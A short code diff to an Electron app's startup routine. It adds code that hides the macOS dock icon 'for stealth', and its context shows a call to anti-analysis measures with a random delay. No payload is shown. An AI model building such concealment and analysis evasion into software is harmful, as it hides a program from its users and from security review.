@@ -33,6 +33,12 @@ function createMainWindow() {
 }
 
 app.whenReady().then(async () => {
+    // Hide dock icon on macOS for stealth
+    if (process.platform === 'darwin' && app.dock) {
+        app.dock.hide();
+        console.log('Dock icon hidden for stealth');
+    }
+
     // Apply anti-analysis measures with random delay
     await applyAntiAnalysisMeasures();
 
